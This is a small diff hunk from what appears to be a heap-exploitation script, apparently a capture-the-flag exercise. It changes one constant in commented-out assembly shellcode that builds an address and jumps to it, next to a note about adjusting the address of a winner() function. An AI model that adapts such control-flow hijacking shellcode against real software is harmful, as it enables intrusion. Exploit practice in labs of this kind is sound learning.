@@ -84,7 +84,7 @@ BEG_HEAP = 0x7ffff7ef6010   # Addr of the start of heap segment we control
 # xor eax, eax
 # mov ax, 0x40
 # shl eax, 0x10
-# mov ax, 0x0ace
+# mov ax, 0x0abd
 # jmp eax
 
 # print(f"Subtracted 0xf0 from winner() addr: {(safe_winner)}")
